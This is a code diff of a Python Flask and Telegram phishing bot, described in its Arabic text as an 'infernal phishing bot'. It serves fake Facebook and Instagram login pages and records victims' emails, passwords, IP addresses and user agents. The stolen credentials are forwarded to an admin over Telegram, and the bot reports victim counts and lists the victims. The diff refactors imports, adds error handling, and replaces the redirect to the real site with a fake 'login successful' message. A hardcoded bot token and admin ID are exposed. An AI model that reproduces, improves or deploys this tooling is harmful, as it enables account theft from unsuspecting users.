@@ -1,18 +1,16 @@
 import os
 import logging
-from flask import Flask, request, render_template_string, jsonify
-import telegram
-from telegram.ext import Dispatcher, CommandHandler, MessageHandler, Filters
+from flask import Flask, request, render_template_string
 import sqlite3
-import datetime
-import requests
+from telegram import Bot, Update
+from telegram.ext import Dispatcher, CommandHandler
 
 # التوكن والآيدي
 BOT_TOKEN = "8236056575:AAHI0JHvTGdJiu92sDXiv7dbWMJLxvMY_x4"
 ADMIN_ID = "7604667042"
 
 app = Flask(__name__)
-bot = telegram.Bot(token=BOT_TOKEN)
+bot = Bot(token=BOT_TOKEN)
 dispatcher = Dispatcher(bot, None, workers=0)
 
 logging.basicConfig(level=logging.INFO)
@@ -104,20 +102,24 @@ def start_command(update, context):
         update.message.reply_text("❌ غير مصرح لك باستخدام هذا البوت")
         return
     
-    welcome_text = """
+    victims_count = get_victims_count()
+    pages_count = get_pages_count()
+    last_victim = get_last_victim()
+    
+    welcome_text = f"""
 🎣 **بوت التصيد الجهنمي**
 
 📊 **الإحصائيات:**
-• عدد الضحايا: {}
-• الصفحات النشطة: {}
-• آخر ضحية: {}
+• عدد الضحايا: {victims_count}
+• الصفحات النشطة: {pages_count}
+• آخر ضحية: {last_victim}
 
 ⚡ **الأوامر:**
 /create_facebook - إنشاء صفحة فيسبوك
 /create_instagram - إنشاء صفحة انستغرام  
 /victims - عرض الضحايا
 /stats - الإحصائيات
-    """.format(get_victims_count(), get_pages_count(), get_last_victim())
+    """
     
     update.message.reply_text(welcome_text, parse_mode='Markdown')
 
@@ -151,6 +153,10 @@ def victims_command(update, context):
     update.message.reply_text(victims_text, parse_mode='Markdown')
 
 # Routes التصيد
+@app.route('/')
+def home():
+    return "🚀 البوت يعمل بنجاح!"
+
 @app.route('/facebook_login')
 def facebook_login():
     return render_template_string(LOGIN_PAGE)
@@ -175,7 +181,7 @@ def submit_facebook():
         parse_mode='Markdown'
     )
     
-    return redirect("https://facebook.com")
+    return "تم تسجيل الدخول بنجاح! جاري التوجيه..."
 
 @app.route('/submit_instagram', methods=['POST'])
 def submit_instagram():
@@ -192,7 +198,7 @@ def submit_instagram():
         parse_mode='Markdown'
     )
     
-    return redirect("https://instagram.com")
+    return "تم تسجيل الدخول بنجاح! جاري التوجيه..."
 
 # دوال مساعدة
 def save_victim(email, password, ip, user_agent, page):
@@ -255,9 +261,13 @@ dispatcher.add_handler(CommandHandler("victims", victims_command))
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    update = telegram.Update.de_json(request.get_json(), bot)
-    dispatcher.process_update(update)
-    return 'OK'
+    try:
+        update = Update.de_json(request.get_json(), bot)
+        dispatcher.process_update(update)
+        return 'OK'
+    except Exception as e:
+        logger.error(f"Webhook error: {e}")
+        return 'ERROR'
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
